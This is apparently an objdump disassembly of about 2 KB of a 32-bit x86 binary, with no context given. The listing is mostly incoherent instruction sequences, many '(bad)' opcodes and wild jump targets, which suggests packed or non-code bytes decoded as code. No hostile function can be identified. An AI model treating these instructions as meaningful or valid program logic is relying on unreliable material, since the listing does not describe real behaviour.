  40f328:	xchg   BYTE PTR [bx+0x74],cl
  40f32c:	mov    cl,BYTE PTR [bx+0x13]
  40f330:	stos   DWORD PTR es:[edi],eax
  40f331:	sbb    ch,BYTE PTR [ebx-0xfd9dd1]
  40f337:	aam    0xfe
  40f339:	xlat   BYTE PTR ds:[ebx]
  40f33a:	inc    eax
  40f33b:	jmp    0xaab438e9
  40f340:	sub    DWORD PTR [esi],eax
  40f342:	clc    
  40f343:	jmp    0xccc3baf0
	...
  40f35c:	add    BYTE PTR [eax],ch
  40f35e:	test   DWORD PTR [edx-0x2],esi
  40f361:	or     DWORD PTR [edi],ecx
  40f363:	cld    
  40f364:	push   edx
  40f365:	mov    gs,WORD PTR [edi]
  40f367:	mov    edi,edi
  40f369:	sub    eax,0x962e180f
  40f36e:	out    0xfe,al
  40f370:	lahf   
  40f371:	ins    BYTE PTR es:[edi],dx
  40f372:	test   BYTE PTR [ebp-0x27],dh
  40f375:	sub    eax,0xe01080e
  40f37a:	xchg   esi,edi
  40f37c:	push   cs
  40f37d:	jle    0x40f304
  40f37f:	dec    esp
  40f380:	add    DWORD PTR [ecx],esp
  40f382:	mov    edi,0x8aaf6a03
  40f387:	(bad)  
  40f388:	jl     0x40f331
  40f38a:	cmp    DWORD PTR ds:0xfead97e9,0x14841f5c
  40f394:	retf   
  40f395:	std    
  40f396:	inc    ecx
  40f397:	add    BYTE PTR [edi],dh
  40f399:	pop    esp
  40f39a:	ret    
  40f39b:	add    ebp,ecx
  40f39d:	sar    DWORD PTR [ecx-0x15],0x0
  40f3a1:	jge    0x40f365
  40f3a3:	repnz push ebx
  40f3a5:	dec    ecx
  40f3a6:	(bad)
  40f3a9:	push   cs
  40f3aa:	add    DWORD PTR [eax],eax
  40f3ac:	(bad)  
  40f3ad:	retf   
  40f3ae:	jb     0x40f3ae
  40f3b0:	(bad)  
  40f3b1:	inc    BYTE PTR [eax]
  40f3b3:	push   DWORD PTR [ebp-0x22]
  40f3b6:	or     DWORD PTR [esp+edi*8+0x1f],eax
  40f3ba:	in     eax,dx
  40f3bb:	sti    
  40f3bc:	push   0xffffffbe
  40f3be:	out    0xff,al
  40f3c0:	imul   eax,DWORD PTR [eax],0x0
	...
  40f3d6:	mov    esi,0xbbfeffe6
  40f3db:	jl     0x40f3da
  40f3dd:	jne    0x40f3a1
  40f3df:	out    0xff,al
  40f3e1:	imul   edi,DWORD PTR [esi-0x41dd3598],0x7ac00b00
  40f3eb:	mov    ch,0x4e
  40f3ed:	push   eax
  40f3ee:	out    0xdc,al
  40f3f0:	push   eax
  40f3f1:	jmp    ecx
  40f3f3:	pop    es
  40f3f4:	inc    esp
  40f3f5:	clc    
  40f3f6:	inc    edi
  40f3f7:	out    0xff,al
  40f3f9:	imul   ecx,DWORD PTR [esi-0x498a012f],0xc1fc7379
  40f403:	repz or ebp,DWORD PTR [edx+0x7e]
  40f407:	out    0xff,al
  40f409:	out    0xe8,eax
  40f40b:	pushf  
  40f40c:	(bad)  
  40f40d:	inc    DWORD PTR [ebp-0x40]
  40f410:	jae    0x40f421
  40f412:	mov    eax,ds:0x5ae8f7f3
  40f417:	sar    esi,1
  40f419:	dec    DWORD PTR [ecx+0x4e00f7c3]
  40f41f:	add    BYTE PTR [eax],al
  40f421:	add    ebx,0x77
  40f424:	(bad)  
  40f425:	jae    0x40f497
  40f427:	jns    0x40f49c
  40f429:	or     BYTE PTR [ecx],al
  40f42b:	cmc    
  40f42c:	imul   eax
  40f42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f42f:	and    ebx,0xc2a110ff
  40f435:	jae    0x40f3ff
  40f437:	jmp    0x4168c4
	...
  40f44c:	add    BYTE PTR [eax],al
  40f44e:	add    BYTE PTR [edi-0x58ddfc4f],ch
  40f454:	cdq    
  40f455:	sub    DWORD PTR [ebx],eax
  40f457:	out    0x20,al
  40f459:	stos   DWORD PTR es:[edi],eax
  40f45a:	jmp    0xbd5a:0xccb19bd
  40f461:	sar    bh,0xd8
  40f464:	enter  0xed9b,0x86
  40f468:	cdq    
  40f469:	add    cl,BYTE PTR [ebx]
  40f46b:	out    0x85,eax
  40f46d:	in     eax,dx
  40f46e:	dec    edi
  40f46f:	push   edi
  40f470:	jno    0x40f402
  40f472:	dec    edi
  40f473:	mov    eax,0xbb447a0c
  40f478:	repnz xor bh,bh
  40f47b:	xor    ah,BYTE PTR ds:0x4ac0e834
  40f481:	xchg   esi,edi
  40f483:	mov    WORD PTR [ebx-0x66307fbe],ss
  40f489:	or     eax,0x8a4688d1
  40f48e:	out    0x66,eax
  40f490:	imul   eax,DWORD PTR [edi-0x71a9d302],0xf6d75e5a
  40f49a:	call   ebx
  40f49c:	adc    BYTE PTR [edi+0x30cd6b82],dl
  40f4a2:	push   edi
  40f4a3:	and    al,0xae
  40f4a5:	xor    al,0x29
  40f4a7:	out    0x99,al
  40f4a9:	add    dh,BYTE PTR [ebp-0x5f]
  40f4ac:	pop    esp
  40f4ad:	sub    cl,cl
  40f4af:	gs xchg ebp,eax
  40f4b1:	add    cl,BYTE PTR [ebp+0x0]
	...
  40f4c7:	add    dl,ah
  40f4c9:	mov    DWORD PTR [ecx],esi
  40f4cb:	(bad)  
  40f4cc:	mov    edx,0xd1309aa5
  40f4d1:	add    ah,dh
  40f4d3:	xchg   DWORD PTR [ebp-0x3480123e],ebp
  40f4d9:	add    ecx,ebp
  40f4db:	add    esp,DWORD PTR [esi]
  40f4dd:	add    eax,0xf2a704cd
  40f4e2:	call   0xe82c1add
  40f4e7:	add    esp,DWORD PTR [edi-0xe77c47d]
  40f4ed:	or     al,0xb1
  40f4ef:	pushf  
  40f4f0:	sub    al,0x29
  40f4f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4f3:	xchg   DWORD PTR [ebp-0x5b7f123e],ebp
  40f4f9:	add    ecx,ebp
  40f4fb:	add    edx,eax
  40f4fd:	or     al,0x8d
  40f4ff:	xchg   DWORD PTR [ebx-0x76],edx
  40f502:	adc    al,al
  40f504:	push   0x41
  40f506:	jmp    0x75c4caa6
  40f50b:	xchg   DWORD PTR [edi],ebx
  40f50d:	cmp    eax,0x8633877d
  40f512:	adc    DWORD PTR gs:[edi-0x19c16c15],ebx
  40f519:	add    al,BYTE PTR [ecx-0x3c]
  40f51c:	xchg   edx,eax
  40f51d:	or     BYTE PTR [ebp+0x7d],0xe3
  40f521:	push   0x45
  40f523:	adc    DWORD PTR [ebx+0x8bb382],eax
  40f529:	push   ebx
  40f52a:	scas   al,BYTE PTR es:[edi]
  40f52b:	inc    esp
	...
  40f540:	add    BYTE PTR [edi+0x69867b6a],ah
  40f546:	sub    BYTE PTR [edi+0x41],0x4b
  40f54a:	xchg   BYTE PTR [ebx+0x6d115897],bl
  40f550:	pop    ebp
  40f551:	push   eax
  40f552:	sub    al,0x82
  40f555:	retf   
  40f556:	push   0xffffffe8
  40f558:	mul    BYTE PTR [edx+eiz*4]
  40f55b:	call   0xffc69c63
  40f560:	jae    0x40f572
  40f562:	or     BYTE PTR ds:0xfe81b665,0xe9
  40f569:	sub    edi,esi
  40f56b:	out    0xd1,eax
  40f56d:	adc    eax,0x8de90023
  40f572:	mul    bh
  40f574:	bound  esp,QWORD PTR [edx]
  40f576:	(bad)  
  40f577:	(bad)  
  40f578:	cwde   
  40f579:	and    edx,ebx
  40f57b:	jmp    0x96f9:0x3baf990f
  40f582:	or     bh,BYTE PTR [eax+esi*8]
  40f585:	cdq    
  40f586:	push   es
  40f587:	sub    al,0xd9
  40f589:	cmp    eax,0xa7282c06
  40f58e:	or     al,0x80
  40f590:	xchg   ebp,eax
  40f591:	hlt    
  40f592:	repz or DWORD PTR [ecx+0x20],ebp
  40f596:	cmp    esi,DWORD PTR [edi-0x14]
  40f599:	and    al,0x6e
  40f59b:	das    
  40f59c:	xchg   edx,eax
  40f59d:	mov    edx,0x2b28ec01
  40f5a2:	inc    esi
  40f5a3:	or     DWORD PTR [ecx+0x0],ebp
	...
  40f5b9:	add    BYTE PTR [esi+eax*1],al
  40f5bc:	or     ch,BYTE PTR ds:0x300acafe
  40f5c2:	mov    bh,0x50
  40f5c4:	pop    eax
  40f5c5:	pusha  
  40f5c6:	iret   
  40f5c7:	pop    esi
  40f5c8:	(bad)  
  40f5c9:	aam    0x2c
  40f5cb:	nop
  40f5cc:	inc    esp
  40f5cd:	dec    ecx
  40f5ce:	inc    ecx
  40f5cf:	(bad)  
  40f5d0:	xlat   BYTE PTR ds:[ebx]
  40f5d1:	jmp    0x6440f87a
  40f5d6:	out    0x56,eax
  40f5d8:	dec    edi
  40f5d9:	ret    
  40f5da:	mov    ds:0xa492ffec,eax
  40f5df:	in     al,dx
  40f5e0:	call   DWORD PTR [edx+0x35448fa4]
  40f5e6:	xchg   esp,eax
  40f5e7:	adc    DWORD PTR [ebx+edi*4],0xffffc26b
  40f5ee:	xor    eax,0xcd227245
  40f5f3:	or     bl,al
  40f5f5:	add    BYTE PTR [edx-0x6d8a0297],dh
  40f5fb:	mov    BYTE PTR [ebx-0x28],dh
  40f5fe:	or     DWORD PTR [ecx],edx
  40f600:	in     al,0xff
  40f602:	jae    0x40f59e
  40f604:	std    
  40f605:	jne    0x40f60d
  40f607:	popf   
  40f608:	mov    ebx,0xfd86d9fc
  40f60d:	jne    0x40f655
  40f60f:	sahf   
  40f610:	xchg   esi,eax
  40f611:	and    BYTE PTR [esi],cl
  40f613:	add    eax,0x9dea75ff
  40f618:	js     0x40f669
  40f61a:	cmp    DWORD PTR [edi+0x75fd],eax
	...
  40f630:	add    BYTE PTR [eax],al
  40f632:	add    BYTE PTR [esi],dh
  40f634:	sahf   
  40f635:	jo     0x40f686
  40f637:	cmp    DWORD PTR [edi-0x61dd8a03],eax
  40f63d:	push   0x8b87194f
  40f642:	inc    ebp
  40f643:	ds ss call 0xfdc889da
  40f64a:	pop    edi
  40f64b:	cwde   
  40f64c:	mov    ebp,0x2fbe0cc0
  40f651:	mov    ebp,esp
  40f653:	or     eax,0x8e6afa43
  40f658:	sbb    al,BYTE PTR [ebp-0x1]
  40f65b:	jae    0x40f6d9
  40f65d:	out    0x81,al
  40f65f:	sub    al,BYTE PTR [edi-0x77ac7603]
  40f665:	std    
  40f666:	jne    0x40f6de
  40f668:	pushf  
  40f669:	and    ch,bh
  40f66b:	mov    ecx,0xe6056885
  40f670:	add    BYTE PTR [edx-0x1],dl
  40f673:	mov    DWORD PTR [ecx-0x42],edi
  40f676:	je     0x40f6d0
  40f678:	xor    al,0x68
  40f67a:	mul    DWORD PTR [edi-0x40ffbbd0]
  40f680:	imul   eax,DWORD PTR [edx],0x5c9201ef
  40f686:	inc    ebp
  40f687:	out    0x69,al
  40f689:	xor    bh,bh
  40f68b:	mov    edx,0xb53d9a61
  40f690:	jo     0x40f615
  40f692:	out    0xba,eax
  40f694:	cmp    BYTE PTR [ebp+0xfe],al
	...
  40f6aa:	add    BYTE PTR [eax],al
  40f6ac:	sbb    bh,dl
  40f6ae:	xchg   esi,edi
  40f6b0:	call   0x8350:0x5b879a61
  40f6b7:	enter  0x6de5,0x2
  40f6bb:	push   ebp
  40f6bc:	sub    al,0x4e
  40f6be:	jg     0x40f683
  40f6c0:	repz and BYTE PTR [edx],bl
  40f6c3:	add    BYTE PTR [ebp+0x27],bh
  40f6c6:	test   DWORD PTR [edi+ebp*4-0x6f],esi
  40f6ca:	xlat   BYTE PTR ds:[ebx]
  40f6cb:	dec    ebx
  40f6cc:	fsub   DWORD PTR [eax-0x1b2cbb87]
  40f6d2:	lds    ecx,FWORD PTR [eax-0x7ffbd581]
  40f6d8:	sub    BYTE PTR [ecx+0xe],0x51
  40f6dc:	dec    edi
  40f6dd:	cld    
  40f6de:	cmp    al,0x41
  40f6e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6e1:	and    BYTE PTR [ebp+esi*2+0xb026986],bl
  40f6e8:	addr16 pop ebp
  40f6ea:	add    bl,ch
  40f6ec:	test   al,0x51
  40f6ee:	xchg   edi,eax
  40f6ef:	inc    ebp
  40f6f0:	out    0x69,al
  40f6f2:	sub    ebp,eax
  40f6f4:	add    cl,BYTE PTR [ebx]
  40f6f6:	add    al,0x0
  40f6f8:	lods   al,BYTE PTR ds:[esi]
  40f6f9:	sub    DWORD PTR [edi],ecx
  40f6fb:	and    edx,eax
  40f6fd:	sar    DWORD PTR [edx+0x57],1
  40f700:	jo     0x40f73a
  40f702:	clc    
  40f703:	mov    edi,0x683252f3
  40f708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f709:	add    ch,cl
  40f70b:	xchg   esp,eax
  40f70c:	sbb    ch,dl
  40f70e:	and    bh,BYTE PTR ds:0x0
	...
  40f724:	add    dh,ah
  40f726:	add    bh,BYTE PTR [ecx+0x10ad384]
  40f72c:	or     eax,0x9b057fb4
  40f731:	push   es
  40f732:	sar    ch,1
  40f734:	sub    DWORD PTR [ebx+esi*1],0x29
  40f738:	dec    edx
  40f739:	sub    DWORD PTR [edi-0x13],edi
  40f73c:	adc    DWORD PTR [esi],0xffffffb0
  40f73f:	and    BYTE PTR [ebx],cl
  40f741:	xchg   edx,eax
  40f742:	scas   eax,DWORD PTR es:[edi]
  40f743:	(bad)  
  40f745:	or     al,0x7f
  40f747:	pop    ebx
  40f748:	or     al,0xff
  40f74a:	push   es
  40f74b:	sbb    eax,0xafdf0183
  40f750:	inc    esi
  40f751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f752:	add    dl,BYTE PTR [edi+ecx*4]
  40f755:	cld    
  40f756:	sub    BYTE PTR [esp+edx*2-0x6e52810f],0x6b
  40f75e:	jle    0x40f798
  40f760:	adc    DWORD PTR [ebx+0x12],0xffffff9e
  40f764:	stc    
  40f765:	pushf  
  40f766:	push   0xffffffa4
  40f768:	and    al,0xa7
  40f76a:	add    ah,dl
  40f76c:	inc    ebx
  40f76d:	mov    cl,0x85
  40f76f:	mov    ebx,0xa602a705
  40f774:	leave  
  40f775:	mov    eax,0xa703e901
  40f77a:	inc    edi
  40f77b:	and    esi,DWORD PTR [ecx+eiz*4+0x6]
  40f77f:	jmp    0xd3440487
  40f784:	add    edi,ebp
  40f786:	add    al,bl
  40f788:	add    eax,DWORD PTR [eax]
	...
  40f79e:	sbb    cl,al
  40f7a0:	pop    eax
  40f7a1:	aam    0x33
  40f7a3:	mov    BYTE PTR [eax],bh
  40f7a5:	jnp    0x40f820
  40f7a7:	jle    0x40f741
  40f7a9:	cmp    bl,0x7a
  40f7ac:	push   DWORD PTR ds:0x4fe77a6e
  40f7b2:	mov    eax,DWORD PTR [edx]
  40f7b4:	add    dl,dh
  40f7b6:	in     al,0xf1
  40f7b8:	add    al,0x10
  40f7ba:	rol    DWORD PTR [edx],cl
  40f7bc:	add    cl,ch
  40f7be:	cmp    al,0x63
  40f7c0:	daa    
  40f7c1:	test   al,0xa4
  40f7c3:	jge    0x40f839
  40f7c5:	fxch   st(4)
  40f7c7:	inc    edx
  40f7c8:	push   eax
  40f7c9:	(bad)  
  40f7ca:	and    eax,0x16198ace
  40f7cf:	xchg   edi,ebp
  40f7d1:	mul    BYTE PTR ds:0x8b3b4f7d
  40f7d7:	mov    dl,0x50
  40f7d9:	fisub  WORD PTR ds:0x8dc5848b
  40f7df:	jl     0x40f7df
  40f7e1:	shr    DWORD PTR [ebp+0x17c6fecc],0xc7
  40f7e8:	repz sbb DWORD PTR [ebx],eax
  40f7eb:	(bad)  
  40f7ec:	inc    esi
  40f7ed:	sub    BYTE PTR [ebx+0x5dbdb47d],ah
  40f7f3:	jl     0x40f7f3
  40f7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f6:	fisttp WORD PTR [ecx]
  40f7f8:	call   0xfebdf3ee
  40f7fd:	pusha  
  40f7fe:	pop    ds
  40f7ff:	push   esi
  40f800:	test   BYTE PTR [esi+0x0],0x0
	...
  40f817:	and    eax,0xc210ffec
  40f81c:	les    eax,FWORD PTR [eax-0x17]
  40f81f:	and    eax,0x257eebb7
  40f824:	jge    0x40f824
  40f826:	hlt    
  40f827:	mov    al,0x6a
  40f829:	in     al,dx
  40f82a:	mov    ecx,0x64887c25
  40f82f:	cld    
  40f830:	je     0x40f830
  40f832:	push   esi
  40f833:	jp     0x40f8b2
  40f835:	mov    bp,0xc26d
  40f839:	(bad)  
  40f83a:	jmp    ecx
  40f83c:	mov    edx,0x80b1f7ea
  40f841:	std    
  40f842:	jne    0x40f7c6
  40f844:	jmp    0x80d24919
  40f849:	xchg   DWORD PTR [ebp-0x20756],eax
  40f84f:	ret    
  40f850:	mov    dl,dl
  40f852:	div    DWORD PTR [ecx-0x3597b180]
  40f858:	dec    eax
  40f859:	aas    
  40f85a:	add    BYTE PTR [ecx+0x31f7eaba],ah
  40f860:	cmp    ebp,0x75
  40f863:	inc    edx
  40f864:	jmp    0x83524919
  40f869:	or     eax,eax
  40f86b:	jp     0x40f886
  40f86d:	cmp    DWORD PTR [ebp-0x204a6],0xfffffffa
  40f874:	jae    0x40f884
  40f876:	call   FWORD PTR [esi+0xe08393]
	...
  40f890:	cmp    DWORD PTR [ebx+0x2d650fd],eax
  40f896:	dec    ebp
  40f897:	push   DWORD PTR [ecx]
  40f899:	out    dx,eax
  40f89a:	adc    cl,BYTE PTR [ebx]
  40f89c:	push   cs
  40f89d:	jp     0x40f8a3
  40f89f:	push   eax
  40f8a0:	ss ja  0x40f8ee
  40f8a3:	push   DWORD PTR [ecx]
  40f8a5:	retf   
  40f8a6:	and    eax,0x29
  40f8a9:	cmp    ebp,0x15
  40f8ac:	into   
  40f8ad:	add    BYTE PTR [eax],al
  40f8af:	push   0xffffffce
  40f8b1:	push   0x67f4771
  40f8b6:	push   DWORD PTR [ebp-0x204de]
  40f8bc:	adc    DWORD PTR [edx+ecx*1-0x18],esi
  40f8c0:	jb     0x40f912
  40f8c2:	std    
  40f8c3:	call   DWORD PTR [edi]
  40f8c5:	test   dl,bl
  40f8c7:	mul    DWORD PTR [edi-0x58967f2c]
  40f8cd:	inc    ecx
  40f8ce:	pop    DWORD PTR [esi-0x1a]
  40f8d1:	imul   edi,DWORD PTR [edi-0x4c],0xfe813583
  40f8d8:	push   0xf6e80ebf
  40f8dd:	cdq    
  40f8de:	jg     0x40f8de
  40f8e0:	cs out dx,eax
  40f8e2:	push   ebx
  40f8e3:	not    BYTE PTR [eax+0x1d]
  40f8e6:	test   DWORD PTR [edi+ebp*2-0x58017ee3],edi
  40f8ed:	pop    esp
  40f8ee:	xchg   BYTE PTR [ebx+0x680269a7],dl
	...
  40f908:	add    BYTE PTR ds:0x1bffc1a5,cl
  40f90e:	scas   eax,DWORD PTR es:[edi]
  40f90f:	jbe    0x40f960
  40f911:	and    BYTE PTR [edi],dh
  40f913:	pop    esp
  40f914:	neg    BYTE PTR [eax]
  40f916:	gs push 0x6b
  40f919:	xchg   ebp,eax
  40f91a:	pop    esp
  40f91b:	jg     0x40f927
  40f91d:	out    0xdd,eax
  40f91f:	inc    DWORD PTR [edx+0x74025582]
  40f925:	jno    0x40f90f
  40f927:	mov    ebp,0x7fbcf8e3
  40f92c:	push   DWORD PTR [esi+eax*8-0x7c]
  40f930:	mov    esp,0xfe7fb4cf
  40f935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f936:	sbb    eax,0x69b767e8
  40f93b:	outs   dx,DWORD PTR ds:[esi]
  40f93c:	mov    ebp,0xe80c1ec8
  40f941:	xor    eax,0xb8fe8122
  40f946:	ds imul esi,esi,0xffffffb0
  40f94a:	cld    
  40f94b:	jg     0x40f9c1
  40f94d:	lahf   
  40f94e:	or     DWORD PTR [eax+0x48],0xb47feca0
  40f955:	add    DWORD PTR [edx],0x5e
  40f958:	adc    BYTE PTR [ecx+0x7f0bd37b],0xba
  40f95f:	lahf   
  40f960:	add    BYTE PTR [ecx+0x7977d37b],0xb5
  40f967:	and    BYTE PTR [eax+0x71],bh
  40f96a:	jnp    0x40f9a9
  40f96c:	test   BYTE PTR [eax],0x0
	...
  40f97f:	add    BYTE PTR [eax],al
  40f981:	add    BYTE PTR [eax+0x61cab16a],ah
  40f987:	jnp    0x40f9b6
  40f989:	mov    dh,0x78
  40f98b:	jae    0x40f9b2
  40f98d:	adc    BYTE PTR [ecx-0xb],0xf0
  40f991:	imul   edx,DWORD PTR [ecx+0x418015c9],0xffffffb5
  40f998:	sub    al,0x78
  40f99a:	cmp    DWORD PTR [ebx+0x5],edi
  40f99d:	imul   BYTE PTR [eax+0x29ca716a]
  40f9a3:	jnp    0x40f99a
  40f9a5:	mov    ch,0xf0
  40f9a7:	jb     0x40f996
  40f9a9:	jg     0x40f9c4
  40f9ab:	cmc    
  40f9ac:	lock imul edx,DWORD PTR [ebx+0x97fddc9],0xffffffb5
  40f9b4:	mov    al,0x77
  40f9b6:	add    DWORD PTR [ebx-0x40],edi
  40f9b9:	xchg   DWORD PTR [ebx+edi*2-0x3b],ebp
  40f9bd:	jg     0x40f9fa
  40f9bf:	push   0xffffffb5
  40f9c1:	jg     0x40f9ac
  40f9c3:	imul   esi,DWORD PTR [eax+edx*8],0xb9ad7ae1
  40f9ca:	cld    
  40f9cb:	jb     0x40f972
  40f9cd:	jg     0x40f997
  40f9cf:	lock sub al,0x7f
  40f9d2:	leave  
  40f9d3:	jp     0x40fa30
  40f9d5:	push   0x6c8d7ab9
  40f9da:	inc    edx
  40f9db:	into   
  40f9dc:	test   DWORD PTR [edi-0x4f],edi
  40f9df:	mov    ah,0x98
  40f9e1:	ja     0x40f98c
  40f9e3:	jp     0x40f9e4
  40f9e5:	add    BYTE PTR [eax],0x0
	...
  40f9f8:	add    BYTE PTR [eax],al
  40f9fa:	add    BYTE PTR [esi+ecx*8-0x2],bh
  40f9fe:	outs   dx,BYTE PTR ds:[esi]
  40f9ff:	sbb    BYTE PTR [edi+0x79105eeb],ch
  40fa05:	(bad)  
  40fa06:	aam    0x98
  40fa08:	jns    0x40fa7e
  40fa0a:	loope  0x40fa18
  40fa0c:	inc    eax
  40fa0d:	cld    
  40fa0e:	dec    esi
  40fa0f:	clc    
  40fa10:	js     0x40f9c6
  40fa12:	push   ebp
  40fa13:	clc    
  40fa14:	js     0x40fa14
  40fa16:	push   ecx
  40fa17:	test   al,0xc6
  40fa19:	(bad)  
  40fa1a:	ss loopne 0x40f9db
  40fa1d:	test   DWORD PTR [eax-0x3],0xd026fe76
  40fa24:	out    dx,al
  40fa25:	sti    
  40fa26:	adc    DWORD PTR [edx],ebx
  40fa28:	sbb    BYTE PTR [eax],al
  40fa2a:	jmp    0xe94c3e22
  40fa2f:	pop    edi
  40fa30:	(bad)  
  40fa31:	jmp    0x40fa9d
  40fa33:	fbld   TBYTE PTR [ebp-0x74]
  40fa36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa37:	test   al,0xc9
  40fa39:	stos   BYTE PTR es:[di],al
  40fa3b:	jmp    0xa0c1fa02
  40fa40:	rol    DWORD PTR [eax-0x17],0x91
  40fa44:	out    dx,al
  40fa45:	or     edx,ecx
  40fa47:	ror    ecx,0xfe
  40fa4a:	(bad)  
  40fa4b:	lods   eax,DWORD PTR ds:[esi]
  40fa4c:	inc    edx
  40fa4d:	jae    0x40fa91
  40fa4f:	rol    DWORD PTR [esp+edi*2+0x5eefa8c5],cl
  40fa56:	mov    esi,0xb14489b4
  40fa5b:	sub    esi,edi
  40fa5d:	div    DWORD PTR [ebp+0x0]
	...
  40fa73:	add    BYTE PTR [ebx-0x57e0fffe],ah
  40fa79:	inc    ecx
  40fa7a:	inc    esp
  40fa7b:	mov    eax,ds:0xe9000250
  40fa80:	dec    ebp
  40fa81:	ret    
  40fa82:	(bad)  
  40fa83:	adc    al,0x3b
  40fa85:	loope  0x40fad3
  40fa87:	add    BYTE PTR [ecx-0x7c7301c1],al
  40fa8d:	jmp    0x0:0x1772e84e
  40fa94:	or     eax,0x7e6a0ac2
  40fa99:	xchg   edx,eax
  40fa9a:	inc    ebx
  40fa9b:	in     al,0x4e
  40fa9d:	ins    DWORD PTR es:[edi],dx
  40fa9e:	add    al,BYTE PTR [edi+0x4f]
  40faa1:	add    eax,0xed5a75ff
  40faa6:	fmul   QWORD PTR [esi-0x17]
  40faa9:	clc    
  40faaa:	or     eax,eax
  40faac:	xor    dl,BYTE PTR [ecx]
  40faae:	push   eax
  40faaf:	push   0xbeef054f
  40fab4:	ds clc 
  40fab6:	jae    0x40fac0
  40fab8:	mov    dh,0xa2
  40faba:	imul   edi,edi,0xffffffa9
  40fabd:	in     eax,dx
  40fabe:	lods   al,BYTE PTR ds:[esi]
  40fabf:	dec    ebx
  40fac0:	cdq    
  40fac1:	clc    
  40fac2:	std    
  40fac3:	dec    ebp
  40fac4:	xchg   esi,eax
  40fac5:	test   BYTE PTR [ebx-0x8],bh
  40fac8:	ds jp  0x40fa81
  40facb:	call   0x3e47ae
  40fad0:	mov    ebx,0x8c330006
  40fad6:	jmp    0x0:0x83
	...
  40faed:	inc    edx
  40faee:	sub    BYTE PTR [eax+0x0],0x74
  40faf2:	aas    
  40faf3:	std    
  40faf4:	jne    0x40fafc
  40faf6:	in     eax,dx
  40faf7:	ror    BYTE PTR [eax-0x17],0xf6
  40fafb:	xchg   DWORD PTR [ebp-0x16],eax
  40fafe:	and    BYTE PTR gs:[edi-0x41],al
  40fb02:	(bad)  
  40fb03:	(bad)  
  40fb04:	xor    eax,0x412d9e
  40fb09:	or     DWORD PTR [ecx+0x6],esi
  40fb0c:	call   0x3e7d3f
  40fb11:	mov    dh,0x24
  40fb13:	inc    edi
  40fb14:	inc    ecx
  40fb15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb16:	imul   ebp,edx,0x1
  40fb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb1a:	imul   eax,DWORD PTR [edx+0x6a733afe],0xffffffdd
  40fb21:	stos   DWORD PTR es:[edi],eax
  40fb22:	idiv   DWORD PTR [esi+edi*8-0x26]
  40fb26:	jns    0x40fb51
  40fb28:	inc    ecx
  40fb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb2a:	call   0x13c00325
  40fb2f:	jge    0x40fb2f
  40fb31:	mov    BYTE PTR [edx+0x0],dl
  40fb34:	add    BYTE PTR [edi-0x508b8317],ah
  40fb3a:	rcr    DWORD PTR [edi],0xff
  40fb3d:	jo     0x40fb00
  40fb3f:	jl     0x40fbb5
  40fb41:	imul   edi,DWORD PTR [ecx],0xfffffff7
  40fb44:	pop    es
  40fb45:	dec    edi
  40fb46:	hlt    
  40fb47:	retf   
  40fb48:	(bad)  
  40fb49:	pop    eax
  40fb4a:	and    eax,DWORD PTR [edx+0x3]
  40fb4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb4e:	mov    dh,0x87
  40fb50:	jmp    0x40fb52
	...
  40fb66:	and    al,0x1e
  40fb68:	pusha  
  40fb69:	push   ebp
  40fb6a:	fadd   DWORD PTR [ebx+0x8ef6a02]
  40fb70:	test   DWORD PTR [edi],0xfeca9e3f
  40fb76:	sub    bl,dh
  40fb78:	(bad)  
  40fb79:	sti    
  40fb7a:	and    al,0xaf
  40fb7c:	adc    al,0x2f
  40fb7e:	imul   ax,WORD PTR [edx],0x2b0f
  40fb83:	scas   eax,DWORD PTR es:[edi]
  40fb84:	add    DWORD PTR [eax],eax
  40fb86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb87:	in     al,dx
  40fb88:	cmp    eax,0x42ad01a
  40fb8d:	add    BYTE PTR [eax-0x58ffbd23],ch
  40fb93:	imul   edi,DWORD PTR [edi+0x3c],0xffc308c5
  40fb9a:	loopne 0x40fbfc
  40fb9c:	xchg   BYTE PTR [edx-0x7cfd965a],dh
  40fba2:	xchg   edx,eax
  40fba3:	add    cl,BYTE PTR [edi-0x16fd99d3]
  40fba9:	or     al,0x2b
  40fbab:	mov    eax,ds:0x83a703e7
  40fbb0:	retf   
  40fbb1:	imul   eax,DWORD PTR [edx-0x67fc173f],0xa7025f7e
  40fbbb:	add    ch,BYTE PTR [edx+0x3e]
  40fbbe:	mov    DWORD PTR [eax],ebp
  40fbc0:	sub    BYTE PTR [edi+eiz*4],al
  40fbc3:	pop    es
  40fbc4:	ins    DWORD PTR es:[edi],dx
  40fbc5:	(bad)  
  40fbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc7:	add    ch,cl
  40fbc9:	add    BYTE PTR [eax],0x0
	...
  40fbdc:	add    BYTE PTR [eax],al
  40fbde:	add    bl,al
  40fbe0:	je     0x40fbe8
  40fbe2:	ret    
  40fbe3:	js     0x40fc5c
  40fbe5:	fld    QWORD PTR [edi+0x3e901f1]
  40fbeb:	and    al,0x35
  40fbed:	fild   QWORD PTR [esi+eiz*8]
  40fbf0:	add    ch,cl
  40fbf2:	or     al,0x23
  40fbf4:	hlt    
  40fbf5:	out    0x3,eax
  40fbf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbf8:	jmp    0x393:0x2e7c45a
  40fbff:	inc    eax
  40fc00:	or     eax,0x2e62cff
  40fc05:	pusha  
  40fc06:	(bad)  
  40fc07:	cmp    BYTE PTR [ebx+0x8287b83],al
  40fc0d:	(bad)  gs:[edi+0x1128e902]
  40fc14:	shr    ch,1
  40fc16:	cmc    
  40fc17:	sbb    BYTE PTR [edi-0x5],dh
  40fc1a:	sbb    eax,0x8ee8c1b8
  40fc1f:	adc    BYTE PTR [ebx],cl
  40fc21:	fcomip st,st(1)
  40fc23:	mov    ds:0xa7051669,eax
  40fc28:	add    dh,BYTE PTR [edx-0x2e]
  40fc2b:	pushf  
